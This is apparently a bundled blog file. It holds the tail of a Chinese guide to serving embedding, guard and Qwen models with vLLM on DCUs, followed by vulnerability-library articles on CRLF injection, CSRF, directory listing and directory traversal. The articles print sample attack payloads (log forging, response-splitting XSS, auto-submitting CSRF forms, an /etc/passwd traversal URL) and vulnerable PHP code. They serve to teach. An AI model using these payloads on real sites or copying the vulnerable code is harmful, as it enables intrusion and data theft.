docker logs --tail 200 rsguard-v1
docker logs --tail 200 qwen3.5-4B
\`\`\`

持续观察：

\`\`\`bash
docker logs -f bge-m3
docker logs -f rsguard-v1
docker logs -f qwen3.5-4B
\`\`\`

### 端口监听

\`\`\`bash
ss -lntp | grep -E '20195|20197|20198'
\`\`\`

## 启动 bge-m3 Embedding 服务

\`bge-m3\` 使用 DCU 0，提供 OpenAI Embeddings 接口。

\`\`\`bash
docker run -d \\
  --shm-size 20g \\
  --network=host \\
  --name bge-m3 \\
  --privileged \\
  --device=/dev/kfd \\
  --device=/dev/dri \\
  --device=/dev/mkfd \\
  --group-add video \\
  --cap-add=SYS_PTRACE \\
  --security-opt seccomp=unconfined \\
  -v /opt/hyhal/:/opt/hyhal \\
  -v /home/ubuntu/models/:/data \\
  -e HIP_VISIBLE_DEVICES=0 \\
  -e ROCR_VISIBLE_DEVICES=0 \\
  image.sourcefind.cn:5000/dcu/admin/base/vllm:0.8.5-ubuntu22.04-dtk25.04.1-py3.10 \\
  python3 -m vllm.entrypoints.openai.api_server \\
  --model /data/bge-m3 \\
  --host 0.0.0.0 \\
  --port 20195 \\
  --served-model-name bge-m3 \\
  --tensor-parallel-size 1 \\
  --dtype half \\
  --task embedding \\
  --gpu-memory-utilization 0.2
\`\`\`

验证：

\`\`\`bash
curl http://10.6.69.241:20195/v1/embeddings \\
  -H "Content-Type: application/json" \\
  -d '{
    "model": "bge-m3",
    "input": "测试文本"
  }'
\`\`\`

## 启动 Qwen3Guard-Gen-8B 内容安全服务

\`rsguard_v1\` 服务使用 DCU 1，底层模型为 \`Qwen3Guard-Gen-8B\`。这里通过 \`--served-model-name rsguard:v1\` 暴露一个业务侧服务名。

\`\`\`bash
docker run -d \\
  --shm-size 20g \\
  --network=host \\
  --name rsguard-v1 \\
  --privileged \\
  --device=/dev/kfd \\
  --device=/dev/dri \\
  --device=/dev/mkfd \\
  --group-add video \\
  --cap-add=SYS_PTRACE \\
  --security-opt seccomp=unconfined \\
  -v /opt/hyhal/:/opt/hyhal \\
  -v /home/ubuntu/models/:/data \\
  -e HIP_VISIBLE_DEVICES=1 \\
  image.sourcefind.cn:5000/dcu/admin/base/vllm:0.8.5-ubuntu22.04-dtk25.04.1-py3.10 \\
  vllm serve /data/rsguard_v1/rsguard_v1 \\
  --served-model-name rsguard:v1 \\
  --gpu-memory-utilization 0.2 \\
  --port 20197 \\
  --host 0.0.0.0
\`\`\`

验证：

\`\`\`bash
curl http://10.6.69.241:20197/v1/chat/completions \\
  -H "Content-Type: application/json" \\
  -d '{
    "model": "rsguard:v1",
    "messages": [
      {
        "role": "user",
        "content": "你好"
      }
    ]
  }'
\`\`\`

如果希望接口层直接暴露 \`Qwen3Guard-Gen-8B\` 作为模型名，需要把启动参数改为：

\`\`\`bash
--served-model-name Qwen3Guard-Gen-8B
\`\`\`

同时调用方请求体也要改成：

\`\`\`json
{"model": "Qwen3Guard-Gen-8B"}
\`\`\`

已经接入业务后不建议随意改这个字段，因为它会影响所有调用方。

## 启动 Qwen 通用大模型服务

Qwen 通用大模型使用 2 张 DCU，容器启动后需要进入容器内启动 vLLM。

创建容器：

\`\`\`bash
docker run -it -d \\
  --shm-size 200g \\
  --network=host \\
  --name qwen3.5-4B \\
  --privileged \\
  --device=/dev/kfd \\
  --device=/dev/dri \\
  --device=/dev/mkfd \\
  --group-add video \\
  --cap-add=SYS_PTRACE \\
  --security-opt seccomp=unconfined \\
  -v /opt/hyhal/:/opt/hyhal \\
  -v /home/ubuntu/.cache/modelscope/hub/models/Qwen/:/data \\
  harbor.sourcefind.cn:5443/dcu/admin/base/custom:vllm018-ubuntu22.04-dtk26.04-gemma4-0413 bash
\`\`\`

进入容器：

\`\`\`bash
docker exec -it qwen3.5-4B bash
\`\`\`

容器内启动：

\`\`\`bash
#!/usr/bin/env bash
set -e

MODEL_PATH="/data/Qwen3___6-35B-A3B/"
MODEL_NAME="Qwen3_6:35BA3B"
PORT=20198
GPU_NUM=2

pkill -f "vllm serve" || true

export PYTORCH_HIP_ALLOC_CONF=expandable_segments:True
export VLLM_USE_TRITON_FLASH_ATTN=1

vllm serve \\
  "$MODEL_PATH" \\
  --served-model-name "$MODEL_NAME" \\
  --port "$PORT" \\
  --trust-remote-code \\
  --dtype bfloat16 \\
  --max-model-len 100000 \\
  --tensor-parallel-size "$GPU_NUM" \\
  --gpu-memory-utilization 0.75 \\
  --block-size 64 \\
  --reasoning-parser qwen3 \\
  --enable-auto-tool-choice \\
  --tool-call-parser qwen3_coder \\
  --default-chat-template-kwargs '{"enable_thinking": false}'
\`\`\`

验证：

\`\`\`bash
curl http://10.6.69.241:20198/v1/chat/completions \\
  -H "Content-Type: application/json" \\
  -d '{
    "model": "Qwen3_6:35BA3B",
    "messages": [
      {
        "role": "user",
        "content": "你好"
      }
    ]
  }'
\`\`\`

## 停止与重启

停止服务：

\`\`\`bash
docker stop bge-m3
docker stop rsguard-v1
docker stop qwen3.5-4B
\`\`\`

删除已停止容器：

\`\`\`bash
docker rm bge-m3
docker rm rsguard-v1
docker rm qwen3.5-4B
\`\`\`

重启服务：

\`\`\`bash
docker restart bge-m3
docker restart rsguard-v1
docker restart qwen3.5-4B
\`\`\`

如果需要修改启动参数，建议停止并删除旧容器后重新执行 \`docker run\`。尤其是 \`model\` 名、端口、模型路径、显存占用比例等参数，修改后都需要重新验证调用方。

## 常见故障处理

### 容器名称冲突

现象：

\`\`\`text
Conflict. The container name is already in use
\`\`\`

处理：

\`\`\`bash
docker ps -a | grep -E 'bge-m3|rsguard-v1|qwen3.5-4B'
docker stop <container_name>
docker rm <container_name>
\`\`\`

然后重新执行启动命令。

### 端口被占用

检查：

\`\`\`bash
ss -lntp | grep -E '20195|20197|20198'
\`\`\`

处理思路：

- 确认占用端口的进程是否为目标模型服务。
- 如果是旧服务进程，先停止旧容器或在容器内执行 \`pkill -f "vllm serve"\`。
- 如果需要更换端口，同步修改启动参数和调用方配置。

### DCU 显存不足

常见现象：

- vLLM 启动失败。
- 日志出现 out of memory 或显存分配失败。

检查：

\`\`\`bash
hy-smi
docker ps
docker logs --tail 200 <container_name>
\`\`\`

处理：

- 降低 \`--gpu-memory-utilization\`。
- 降低 \`--max-model-len\`。
- 确认同一张 DCU 上没有其他高显存进程。
- 对多卡模型确认 \`--tensor-parallel-size\` 与可用 DCU 数量匹配。

### 模型路径错误

检查模型目录：

\`\`\`bash
ls -lh /home/ubuntu/models/
ls -lh /home/ubuntu/.cache/modelscope/hub/models/Qwen/
\`\`\`

处理：

- 确认宿主机目录存在。
- 确认 Docker \`-v\` 挂载路径正确。
- 确认容器内模型路径与启动参数一致。

### DCU 设备不可见

检查设备：

\`\`\`bash
ls -l /dev/kfd /dev/dri /dev/mkfd
hy-smi
\`\`\`

处理：

- 确认容器启动参数包含 \`--device=/dev/kfd\`、\`--device=/dev/dri\`、\`--device=/dev/mkfd\`。
- 确认容器启动参数包含 \`--group-add video\` 和 \`--privileged\`。
- 确认环境变量 \`HIP_VISIBLE_DEVICES\` 或 \`ROCR_VISIBLE_DEVICES\` 指向正确 DCU。

### model 字段不匹配

请求体中的 \`model\` 必须与服务启动时的 \`--served-model-name\` 一致。

当前服务对应关系：

\`\`\`text
bge-m3      -> model: bge-m3
rsguard_v1  -> model: rsguard:v1
Qwen        -> model: Qwen3_6:35BA3B
\`\`\`

其中 \`rsguard_v1\` 的底层开源模型是 \`Qwen3Guard-Gen-8B\`，但接口层模型名是 \`rsguard:v1\`。如果调用时传 \`Qwen3Guard-Gen-8B\`，而服务启动参数没有同步修改，就会出现模型名不匹配。

## 变更注意事项

- 修改模型端口后，需要同步更新调用方地址。
- 修改模型名称后，需要同步更新请求体中的 \`model\` 字段。
- 修改模型目录后，需要同步检查 Docker 挂载路径和容器内路径。
- Qwen 服务在容器内启动 vLLM，重启容器后需确认容器内服务进程是否已重新拉起。
- bge-m3 使用 DCU 0，\`rsguard_v1\` 使用 DCU 1，Qwen 服务使用 2 张 DCU，启动前需确认显存资源是否足够。

## 小结

海光 DCU 上的大模型部署主要难点不在命令本身，而在资源绑定、模型命名和接口约定的一致性。

\`rsguard_v1\` 是服务层命名，背后的实际模型是 \`Qwen3Guard-Gen-8B\`。在文档中把服务名、模型名、目录路径和请求体 \`model\` 字段拆清楚，可以减少后续排障成本，也能避免调用方在模型升级时频繁变更接口。

`,kb=`---
title: CRLF 注入
date: 2026-05-19
summary: CRLF 注入是一个漏洞，恶意黑客可以通过注入回车 (CR) 和换行 (LF) 字符来改变 Web 应用程序的工作方式或迷惑其管理员。 CRLF 注入有两种主要的恶意用途：日志中毒（也称为日志注入、日志分裂或日志伪造）和 HTTP 响应分裂
tags: 漏洞库, Web安全, CRLF
cover: app-teal
readingTime: 6 分钟
featured: false
---
# CRLF 注入

### 什么是 CRLF 注入

CRLF 注入是一个漏洞，恶意黑客可以通过注入回车 (CR) 和换行 (LF) 字符来改变 Web 应用程序的工作方式或迷惑其管理员。 CRLF 注入有两种主要的恶意用途：日志中毒（也称为日志注入、日志分裂或日志伪造）和 HTTP 响应分裂。

攻击者可以使用 CRLF 注入升级到其他类型的漏洞，主要是跨站点脚本攻击 (XSS)。 CRLF 注入还可用于 Web 应用程序来影响电子邮件行为 - 这称为电子邮件注入（电子邮件标头注入）。

### 什么是 CRLF

CR 和 LF 是 ASCII 表的特殊字符（13 和 10）。 它们也经常在这两个字符的转义码之后被称为 \\r\\n (\\r = CR, \\n = LF)。

CR 和 LF（一起或单独）用于表示操作系统和 Internet 协议（包括 HTTP）中的行尾 (EoL)。 Windows 使用 CRLF 组合，Linux/UNIX 等操作系统和当前的 macOS 仅使用 LF 来实现此目的，而旧版 Mac 操作系统仅使用 CR。

### 什么是日志中毒

在基于CRLF注入的日志投毒攻击中，恶意黑客将CRLF字符注入到Web服务器日志文件中，以迷惑自动日志分析系统和手动浏览日志的系统管理员。

#### Web服务器日志的格式

许多 Web 服务器（例如 Apache）使用 NCSA 通用日志格式 (CLF)。 通用日志格式条目的格式始终相同：

    host ident user date request status size

例如：

    233.252.0.123 - - [11/Oct/2022:11:34:50 +0100] "GET /example.php?id=3 HTTP/1.0" 200 452

以下是您阅读此条目的方式：

* \`233.252.0.123\` 是主机 – 请求来自的 IP 地址。

* \`-\` 是客户端的 RFC 1413 身份。 破折号 (-) 表示没有数据，这是通常的值。

* \`-\` 是请求该文档的人的用户 ID。 破折号 (-) 表示没有数据，这是通常的值（除非 .htaccess 中有身份验证）。

* \`[11/Oct/2022:11:34:50 +0100]\` 是收到请求时的时间戳，通常采用 strftime 格式：%d/%b/%Y:%H:%M:%S %z 。

* \`“GET /example.php?id=3 HTTP/1.0”\`  是从客户端收到的请求行，包括 HTTP 方法 (GET)、请求的资源和参数 (/example.php?id=3) 以及协议 （HTTP/1.0）。
* \`200\` 是发送到客户端的 HTTP 状态代码。
* \`452\` 是返回对象的大小（以字节为单位）。

另一种标准格式是组合日志格式，它类似，但有一些额外的字段。

#### 日志中毒示例

想象一下，客户端能够将 CR 和 LF 字符注入到发送到 www.example.com Web 服务器的请求中，并且它发送以下请求：

\`\`\`
https://www.example.com/example.php?id=3+HTTP%2F1.0%22+200+452%0D%0A
10.0.23.30+-+admin+%5B01%2FJan%2F2020%3A00%3A00%3A00+%2B0100%5D+%22GET+%2Fadmin.php%3Fuserid%3D12
\`\`\`

该请求包含一个假日志条目，因此当它被记录时，日志文件将包含一个额外的行：

\`\`\`
233.252.0.123 - - [11/Oct/2022:11:34:50 +0100] "GET /example.php?id=3 HTTP/1.0" 200 452
10.0.23.30 - admin [01/Jan/2020:00:00:00 +0100] "GET /admin.php?userid=123 HTTP/1.0" 200 452
\`\`\`
带下划线的字符表示使用 CRLF 注入注入的内容（\`%0D%0A\` 是编码的 CRLF 字符）。

分析此日志的监控工具和管理员可能会对这个奇怪的条目感到困惑——它看起来像是一个经过身份验证的管理员用户在很久以前的某个时间请求了 admin.php 资源。 这种混乱可能会让攻击者分散管理员的注意力并延迟日志分析，以期逃脱在以后的日志条目中出现的其他恶意操作。

### 什么是 HTTP 响应拆分

在 HTTP 响应拆分攻击中，攻击者将 CRLF 序列注入 HTTP 响应中，以修改浏览器解释 HTTP 标头和请求正文的方式。 CRLF 注入可用于向请求正文添加恶意内容或添加额外的 HTTP 标头。

* 单个 CRLF 序列意味着一个标头结束而另一个标头开始。
* 双 CRLF 序列将所有标头与正文分开。 HTTP请求体包含客户端提交的数据，而响应体通常包含服务器返回的网站数据。

相应地，攻击者修改HTTP流量的方式有两种：

* 如果攻击者将单个 CRLF 插入到 HTTP 响应标头中，他们可以在此换行符后面添加一个新标头。 例如，他们可以注入 Location 标头以将用户重定向到攻击者控制的网站。 网络犯罪分子可以使用这种技术（通常称为 HTTP 标头注入）进行网络钓鱼或篡改。

* 如果攻击者插入双 CRLF，他们可以提前终止 HTTP 标头并在实际网站内容之前注入恶意内容。 注入的内容可以包括 JavaScript 代码。 攻击者甚至可以使浏览器忽略来自网络服务器的所有合法网站内容。 这就是 HTTP 响应拆分如何导致跨站点脚本注入的原因。

注意，攻击者还可能向有毒代理或 Web 缓存注入特殊标头，从而允许他们向许多用户提供恶意内容。

### XSS 拆分 HTTP 响应的示例

在以下示例中，攻击者使用 HTTP 响应拆分和 HTTP 标头注入来发送 HTTP 请求，该请求向 HTTP 响应添加额外的标头、过早终止标头，并引入反射的跨站点脚本漏洞。

攻击者在钓鱼电子邮件中发送以下有效负载，吸引用户单击链接或按钮：

\`\`\`
http://www.example.com/example.php?id=%0d%0aContent-Length:%200%0d%0a%0d%0a
HTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a
%3Cscript%3Ealert(1)%3C/script%3E
\`\`\`

有效负载使用 CRLF 注入来分割 HTTP 响应，如下所示：

* \`http://www.example.com/example.php?id=\` - 向具有 CRLF 注入漏洞的页面发起有效请求。

* \`%0d%0aContent-Length:%200\` - Content-Length: 0 的虚假 HTTP 响应标头。这会导致 Web 浏览器将此响应视为已终止并开始解析下一个响应。

* \`%0d%0a%0d%0aHTTP/1.1%20200%20OK\` - 注入的新响应以双 CRLF 序列开始，后跟 HTTP/1.1 200 OK。

* \`%0d%0aContent-Type:%20text/html\` - 另一个伪造的 HTTP 响应标头：Content-Type: text/html。 这是浏览器将此数据视为 HTML 内容所必需的。

* \`%0d%0aContent-Length:%2025\` - 另一个伪造的 HTTP 响应标头：Content-Length: 25。这指示浏览器仅解析接下来的 25 个字节，并将任何剩余数据作为垃圾丢弃，导致浏览器忽略合法的 HTTP 内容 由网络服务器发送。

* \`%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E\` - 双 CRLF 序列表示标头已结束且响应正文开始。 注入的页面内容是\`<script>alert(1)<\/script>\`，这会导致用户的浏览器显示警报而不是实际的example.php页面。

### CRLF 注入攻击的潜在后果
CRLF 注入的影响似乎有限，但它们在 A03:2021-注入部分的 OWASP 2021 年十大 Web 应用程序安全列表中提到。 攻击者可以使用此技术升级为更危险的恶意攻击，例如跨站点脚本、页面劫持、跨用户篡改等。

HTTP 响应拆分漏洞允许攻击者修改 HTTP 标头并绕过特定的安全机制，例如 XSS 过滤器、cookie 安全标志和同源策略 (SOP) 限制。 这为执行某些类型的中间人攻击 (MITM) 和利用跨站点请求伪造 (CSRF) 漏洞开辟了道路，进而可能导致敏感信息泄露或更多。

`,Ib=`---
title: CSRF
date: 2026-05-18
summary: 跨站点请求伪造 (CSRF) 是一种 Web 漏洞，恶意黑客可以利用该漏洞诱骗受害者提交请求，从而允许攻击者代表受害者执行状态更改操作。
tags: 漏洞库, Web安全, CSRF
cover: app-blue
readingTime: 6 分钟
featured: false
---
# CSRF

### 什么是跨站请求伪造（CSRF）

跨站点请求伪造 (CSRF) 是一种 Web 漏洞，恶意黑客可以利用该漏洞诱骗受害者提交请求，从而允许攻击者代表受害者执行状态更改操作。 

### 跨站请求伪造是如何工作的

大多数 Web 应用程序都需要身份验证，经过身份验证的用户才能够执行非常敏感的操作。 Web 应用程序中的身份验证通常基于用户会话来执行。 进行身份验证后，您的浏览器会在您的计算机上存储一个会话 cookie，并随您向该 Web 应用程序发出的每个请求一起发送该 cookie。 不太常见的是，应用程序还可以使用 NTLM 或基本身份验证来代替会话 cookie 进行身份验证，甚至可以根据 IP 地址识别用户。

当您使用应用程序时，从浏览器发送到应用程序的许多 HTTP 请求都是您显式操作的结果，例如，当您在地址栏中键入 URL 或单击链接时。 但是，其他 HTTP 请求是由浏览器在处理当前网页上包含的代码时隐式发送的。 例如，如果页面包含图像，则将通过单独的 HTTP 请求获取该图像。

此类隐式请求也可以定向到与您正在查看的页面位置无关的域。 例如，test.com 上显示的图像实际上可能来自 example.com。 在这种情况下，最重要的是，对两个位置的请求来自同一浏览器，因此您当前的身份验证方法（无论是会话 cookie 还是其他方法）适用于这两个位置。 因此，如果您的浏览器打开 test.com 并从 example.com 获取图像，从而在 example.com 创建用户会话，则 example.com Web 应用程序会将您视为经过身份验证的用户（即使您最初打开 test.com， 不是 example.com）。

结合起来，可以利用这两种行为通过以下方式执行跨站点请求伪造攻击：

1. 受害者在目标 Web 应用程序（例如 example.com）中进行身份验证。

2. 攻击者使用社交工程诱骗受害者访问恶意网站（例如 test.com）。

3. 恶意网页包含导致受害者浏览器向目标（例如 example.com）发送隐式请求的代码（例如图像标签）。

4. 恶意请求会导致目标执行用户无意的操作。 后果将根据应用程序而有所不同。


### 跨站请求伪造漏洞的类型

CSRF 漏洞可能基于 GET 或 POST 请求。

对于基于 GET 请求的 CSRF，攻击者可以简单地在恶意页面上使用图像标签（或任何其他允许跨站点请求的标签）：

    <img src="http://example.com/bank.php/?action=transfer&target=attacker_account">

当用户访问带有上述图像标签的页面时（例如，点击恶意链接后），用户的浏览器会尝试打开该图像，但却向目标站点发出 GET 请求，从而在登录时使用用户的帐户执行恶意操作。 假设用户在 example.com 上经过身份验证，Web 应用程序将无法区分合法用户请求和恶意请求，因为它们都是从同一浏览器发送的。

对于基于 POST 请求的 CSRF，攻击者需要付出更多的努力。 执行此类攻击的最简单方法是使用 JavaScript 强制用户的浏览器自动提交表单：

\`\`\`
<body onload="document.csrf.submit()">
<form action="http://example.com/bank.php" method="POST" name="csrf">
    <input type="hidden" name="action" value="transfer">
    <input type="hidden" name="target" value="attacker_account">
</form>
\`\`\`
\\<body> 中的 onload 参数将导致浏览器在用户打开恶意页面后立即提交表单。

### 跨站点请求伪造攻击示例

金融业务应用程序的开发人员创建了一个功能，允许用户设置他们想要用于从应用程序获取每日财务报告的电子邮件地址。 要设置或更改电子邮件地址，经过身份验证的用户必须在 http://example.com/set_email.php 页面上填写 HTML 表单：

\`\`\`
<form action="/set_email.php" method="post" id="set_email">
    <label for="email">Enter the email address to receive reports:</label>
    <input type="email" id="email" name="email">
    <button type="submit" form="submit" value="submit">Set email</button>    
</form>
\`\`\`

攻击者创建一个恶意页面http://example.attacker/exploit.html，内容如下：

\`\`\`
<body onload=document.email.submit()>
    <form action="http://example.com/set_email.php" method="post" name="email">
        <input type="hidden" id="email" value="attacker@example.attacker">
    </form>
</body>
\`\`\`

然后，攻击者创建一封钓鱼电子邮件并将其发送给金融应用程序的用户，诱骗用户访问http://example.attacker/set_email.html。 假设用户已经通过 example.com 登录到应用程序，则应用程序将收到伪造的请求，并将报告电子邮件更改为attacker@example.attacker。 因此，攻击者将每天收到有关公司财务运营的敏感报告。

### 跨站点请求伪造攻击的潜在后果

跨站点请求伪造漏洞被视为中等严重程度，原因如下：

* 在此类攻击中，攻击者永远不会收到 HTTP 响应，因此无法使用此技术直接读取/访问敏感信息。 他们甚至无权访问随恶意请求发送的会话 cookie 值。

* 攻击受到 Web 应用程序功能的限制，或者更准确地说，受到应用程序允许当前用户使用状态更改请求执行的操作的限制。 例如，如果您有一个票证系统，并且当前用户只能创建和解决问题，那么攻击者通过 CSRF 最多只能清除票证队列。 例如，他们将无法获得管理员的凭据。

* 当针对特定个人或一小群拥有高权限的人时，这种类型的攻击最为有效。 与跨站脚本 (XSS) 不同，向大量随机受害者发送恶意 CSRF 有效负载通常没有任何意义。 CSRF 通常是精心准备的，以利用业务中的特定用户，例如 CEO、管理员或财务部门员工。



`,Nb=`---
title: 目录列表漏洞
date: 2026-05-17
summary: 目录列表是一项可能导致漏洞的 Web 服务器功能。 启用后，它显示没有索引文件的目录的内容。 应始终关闭此功能。 启用它是危险的，因为它会导致信息泄露。
tags: 漏洞库, Web安全, 目录安全
cover: app-yellow
readingTime: 6 分钟
featured: false
---
# 目录列表漏洞

### 什么是目录列表漏洞

目录列表是一项可能导致漏洞的 Web 服务器功能。 启用后，它显示没有索引文件的目录的内容。 应始终关闭此功能。 启用它是危险的，因为它会导致信息泄露。

### 目录列表如何工作
首先举个例子，当用户在浏览器地址栏中键入 www.test.com/learn/ 而不在 URL 中指定文件名（例如 index.html、index.php、index.htm 或 default.asp）时 ），Web 服务器处理此请求，返回该目录（在本例中为 /learn/ 目录）的索引 HTML 文件，并且 Web 浏览器显示网页。 但是，如果索引文件不存在并且启用了目录列表，则 Web 服务器将返回目录的内容，就像文件管理器一样。

### 为什么 Web 服务器管理员要打开目录列表

许多网络服务器管理员仍然遵循默默无闻的安全概念。 他们假设如果目录中没有指向文件的公共链接，则没有人可以访问它们。 这是不正确的，尤其是当启用目录列表并且黑帽黑客可以轻松找到目录中的所有文件时尤其不正确（事实上，甚至搜索引擎也可以索引此类目录）。 这就是为什么目录列表永远不应该打开的原因，尤其是在托管动态网站和 Web 应用程序时。

许多 Web 服务器默认启用目录列表的另一个原因是，为了方便起见，许多较旧的 Web 服务器版本默认启用了此功能。 当时网络安全不太受关注，访问权限也很宽松。 如今，大多数 Web 服务器发行版（无论是 Linux 还是 Windows）都默认关闭目录列表。

### 不带目录列表的目录浏览
即使在 Web 服务器上禁用目录列表，攻击者仍然可能发现并利用允许他们执行目录浏览的 Web 服务器漏洞。 例如，有一个旧的 Apache Tomcat 漏洞，其中对空字节 (%00) 和反斜杠 (\\) 的不当处理使服务器容易受到目录列表攻击。

攻击者还可能使用在线数据库中包含的缓存或历史数据发现目录索引。 例如，Google 的缓存数据库可能包含以前启用目录列表的目标的历史数据，即使该功能现在已禁用。 此类数据使攻击者无需利用漏洞即可获取有用信息。

### 目录列表攻击示例
用户向 www.vulnweb.com/admin/ 发出网站请求。 服务器的响应包括目录 admin 的目录内容，如下面的屏幕截图所示。
![Alt text](listing1.png)

从上面的目录列表中，您可以看到在 admin 目录中，有一个名为 backup 的子目录，其中可能包含足够的信息供攻击者发起攻击。

![Alt text](listing2.png)

攻击者可以显示备份目录中的完整文件列表。 该目录包含密码文件、数据库文件、FTP 日志和 PHP 脚本等敏感文件。 显然，这些信息并不是供公众查看的。

Web 服务器配置错误导致文件列表泄露，并且数据已公开。 更糟糕的是，此类文件（例如 FTP 日志）可能包含其他敏感信息，其中可能包括用户名、IP 地址或 Web 托管操作系统的完整目录结构。`,vb=`---
title: 目录遍历
date: 2026-05-16
summary: 目录遍历（路径遍历）是一种 Web 漏洞，它允许恶意黑客访问和查看位于 Web 服务器文件系统中但位于 Web 应用程序文档根文件夹之外的文件。
tags: 漏洞库, Web安全, 目录安全
cover: app-teal
readingTime: 6 分钟
featured: false
---
# 目录遍历

### 什么是目录遍历

目录遍历（路径遍历）是一种 Web 漏洞，它允许恶意黑客访问和查看位于 Web 服务器文件系统中但位于 Web 应用程序文档根文件夹之外的文件。

<br>

### 目录遍历如何工作
构成网站或 Web 应用程序的源代码文件位于 Web 服务器文件系统中称为 Web 文档根目录（Web 根文件夹）的位置。 主文档根目录通常包含每个网站和 Web 应用程序的子目录。 例如，在装有 Apache Web 服务器软件的 Linux/UNIX 服务器上，默认的根文件夹是 /var/www/，在装有 IIS 的 Microsoft Windows 服务器上，默认的文档根目录是 C:\\inetpub\\wwwroot。

开发人员有时需要编写应用程序代码来直接访问存储在文档根目录或子目录中某处的文件。 例如，开发人员可能希望存储用户上传的图像，然后允许其他用户显示它们。 然后，用户输入参数将包含来自 /var/www/my_app/images/ 的图像文件名，应用程序将打开特定图像并将其显示在屏幕上。

当恶意用户可以在用户输入中包含任意文件路径并使用特殊字符访问服务器上不同目录中的文件时，就会发生目录遍历漏洞。 用于此的特殊字符是\`点-点-斜线\`组合：\`../\` 用于 Linux/UNIX 或 \`..\\\` 用于 Windows。 这些组合允许从相对路径访问父目录。

虽然目录遍历是一种典型的 Web 应用程序漏洞，但它最常出现在嵌入式 Web 软件中，例如，设备管理软件或远程管理界面。 一些路径遍历漏洞甚至归因于 Web 服务器本身。

<br>

### 目录遍历 与 本地文件包含 (LFI)
路径遍历漏洞经常与本地文件包含 (LFI) 相混淆，这是一个相似但不同的漏洞：

- LFI 意味着攻击者可以包含源代码文件或查看位于文档根目录及其子目录中的文件。 这并不意味着攻击者可以到达文档根目录之外。
- 目录遍历意味着攻击者可以访问位于文档根目录之外的文件，但攻击不涉及运行任何恶意代码。
更让人困惑的是，这两者经常一起出现，而且原因也完全相同：开发人员允许将本地文件的路径作为用户输入的一部分传递。

<br>

### 目录遍历攻击示例
下面是一个简单的 PHP 源代码示例，在包含此代码的应用程序上存在目录遍历漏洞和路径遍历攻击向量。

#### 易受攻击的代码

PHP 应用程序的开发人员希望用户能够阅读存储在 Web 服务器上的文本文件中的诗歌。 这些文本文件中的诗歌由其他用户上传并存储在相对的诗歌目录中——图像目录的绝对路径是/var/www/my_app/poems/。 以下是来自 poems/display.php 文件的代码片段，它将诗歌显示为 HTML 的一部分。

<font color="#e90"><\\?PHP </font>
  <font color="#a67f59">\\$file</font> = <font color="#a67f59">\\$_GET</font>[<font color="#00dd00">"file"</font>];
    <font color="#a67f59">\\$handle</font> = <font color="#00dd00">fopen</font>(<font color="#a67f59">\\$file</font>, <font color="#00dd00">'r'</font>);
    <font color="#a67f59">\\$poem</font> = <font color="#00dd00">fread</font>(<font color="#a67f59">\\$handle</font>, <font color="red">1</font>);
    <font color="#00dd00">fclose</font>(<font color="#a67f59">\\$handle</font>);
  <font color="#00dddd">echo</font> <font color="#a67f59">\\$poem</font>;
<font color="#e90">?></font>

如您所见，文件名直接取自从用户收到的 GET HTTP 请求。 因此，您可以使用以下 URL 访问并显示一首名为 poem.txt 的诗：

    http://example.com/my_app/display.php?file=poem.txt

#### 攻击向量
攻击者通过使用以下有效负载操纵 GET 请求来滥用此脚本：

    http://example.com/my_app/display.php?file=../../../../etc/passwd

display.php 脚本在目录结构中向上四层到 Linux 根目录，然后到 /etc/ 目录，然后显示 passwd 文件，其中包含此服务器上所有操作系统用户的名称：

    root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    (...)

<br>

### 目录遍历攻击的潜在后果
目录遍历攻击的唯一直接后果是访问敏感信息。 这些敏感信息可能会被直接使用或用于跟进其他攻击。 如果服务器上的文件中存储有敏感信息，例如文档的机密照片或文本文件中的敏感数据，攻击者就可以找到并访问这些文件。

在其他情况下，目录遍历攻击用于访问存在于许多 Web 服务器上的典型文件。 然后，攻击者可以使用这些文件中的信息来寻找其他应用程序安全攻击方法，这可能最终导致整个服务器遭到破坏。

由于 Web 服务器及其应用程序使用用于 Web 服务器进程的系统帐户\`有限权限\`访问文件，因此某些敏感文件，例如 /etc/shadow（带哈希的 Linux/UNIX 密码文件）以及受限目录，是目录遍历攻击无法访问的。

- /proc/version – 包含系统上运行的 Linux 内核的版本。 此信息允许攻击者找到针对该特定 Linux 内核的漏洞。
- /proc/mounts – 包含当前安装的文件系统的列表。 这允许攻击者尝试访问这些文件系统，例如，通过后续的目录遍历攻击。
- /proc/net/arp – 包含地址解析协议 (ARP) 表，可用于发现其他连接的系统（潜在的攻击目标）。
- /proc/net/tcp 和 /proc/net/udp – 包含正在进行的 TCP/UDP 连接的列表，可用于发现其他连接的系统（同样是潜在的攻击目标）。

请注意，目录遍历很容易通过称为模糊测试的技术实现自动化，该技术涉及自动将典型的攻击有效载荷发送到目标。 攻击者可以使用 [DotDotPwn](http://dotdotpwn.blogspot.com/) 等专用模糊测试应用程序，因此此类攻击只需要很少的技术知识。

<br>

### 如何防止Web应用中的目录遍历漏洞
有几种方法可以让您防止代码中的目录遍历漏洞：

1.  避免在用户输入中传递任何文件名。 这不仅包括直接用户输入，还包括攻击者可以操纵的其他数据源，例如 cookie。
2. 如果您的应用程序要求您使用用户输入的文件名并且没有办法解决它，请创建一个安全文件白名单。
3. 如果因为使用任意文件名而无法创建白名单，例如，如果用户上传文件，将文件名存储在数据库中，并在用户输入中使用表行标识符。 您还可以使用 URL 映射来识别没有路径遍历风险的文件。

上述方法在每种编程语言中都可用，因此每个开发人员都可以通过使用安全编码技术轻松防止目录遍历漏洞。 没有理由让您的应用程序容易受到目录遍历的攻击。

注意：请勿使用黑名单、编码或过滤等输入验证方法来防止目录遍历。 例如，不要试图限制或强制执行文件扩展名或阻止特殊字符序列。 攻击者可以使用各种技巧（例如 URL 编码）来绕过此类过滤器。

<br>

### 如何缓解目录遍历攻击
减轻目录遍历攻击的方法因软件类型而异：

- 对于自定义 Web 应用程序，您可以通过在有限环境中运行 Web 应用程序来减轻目录遍历攻击，这对于 Web API 来说非常常见。 例如，在单独的 Docker 容器中运行您的应用程序将限制攻击者可以访问的文件数量，并限制访问系统信息的潜在影响。
- 如果您不能在单独的容器中运行自定义 Web 应用程序，您可以设置 Web 服务器访问控制以完全拒绝对任何父目录的访问。 您可以让 Web 应用程序看起来好像文档根目录是文件系统的根目录，这将使攻击者无法在目录树中向上移动。
- 对于第三方软件（例如硬件路由器b和防火墙的管理软件）中的已知目录遍历，您必须检查最新的安全建议以获取修复并更新到不易受攻击的版本。

